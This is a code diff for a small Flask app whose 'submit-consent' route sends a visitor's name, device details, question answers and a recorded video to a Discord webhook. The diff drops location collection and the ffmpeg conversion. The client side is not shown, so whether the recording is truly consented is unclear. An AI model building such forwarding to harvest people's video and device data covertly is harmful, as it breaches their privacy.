@@ -1,6 +1,5 @@
 import os
 import json
-import subprocess
 import requests
 from flask import Flask, render_template, request, jsonify
 
@@ -18,7 +17,6 @@ def home():
 @app.route("/submit-consent", methods=["POST"])
 def submit_consent():
     username = request.form.get("username", "Utilisateur Anonyme")
-    location = request.form.get("location", "Non disponible")
     
     device_str = request.form.get("device", "{}")
     try:
@@ -26,13 +24,12 @@ def submit_consent():
     except Exception:
         device = {}
 
-    # جمع الـ 20 سؤالاً تلقائياً
     questions_summary = []
     for i in range(1, 21):
         val = request.form.get(f"q{i}", "N/A")
         questions_summary.append(f"Q{i}: {val}")
     
-    q_text = " | ".join(questions_summary[:5]) # عينة أو كلها حسب الرغبة
+    q_text = " | ".join(questions_summary[:5])
 
     video_file = request.files.get("video")
 
@@ -72,33 +69,19 @@ def submit_consent():
         "content": content_text
     }
 
-    input_path = "temp_input.webm"
-    output_path = "recording.mp4"
-
     try:
         files = {}
         if video_file:
-            # حفظ الملف المؤقت القادم من المتصفح
-            video_file.save(input_path)
+            # قراءة الملف وإرساله مباشرة بالاسم الذي حدده المتصفح
+            filename = video_file.filename or "recording.mp4"
+            file_bytes = video_file.read()
             
-            # محاولة تحويل الفيديو إلى MP4 باستخدام ffmpeg ليعمل مباشرة في ديسكورد
-            try:
-                subprocess.run([
-                    "ffmpeg", "-y", "-i", input_path, 
-                    "-c:v", "libx264", "-preset", "ultrafast", 
-                    "-c:a", "aac", output_path
-                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                
-                with open(output_path, "rb") as f:
-                    files = {
-                        "file": ("recording.mp4", f.read(), "video/mp4")
-                    }
-            except Exception:
-                # في حال لم يكن ffmpeg مثبتاً، يتم إرسال الملف كما هو
-                with open(input_path, "rb") as f:
-                    files = {
-                        "file": ("recording.webm", f.read(), "video/webm")
-                    }
+            # تحديد الـ Content-Type الصحيح لكي يعرضه ديسكورد كفيديو
+            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
+            
+            files = {
+                "file": (filename, file_bytes, content_type)
+            }
 
         resp = requests.post(
             DISCORD_WEBHOOK_URL, 
@@ -108,14 +91,8 @@ def submit_consent():
         )
         resp.raise_for_status()
 
-        # تنظيف الملفات المؤقتة
-        if os.path.exists(input_path): os.remove(input_path)
-        if os.path.exists(output_path): os.remove(output_path)
-
         return jsonify({"message": "Success"}), 200
     except requests.RequestException as e:
-        if os.path.exists(input_path): os.remove(input_path)
-        if os.path.exists(output_path): os.remove(output_path)
         return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
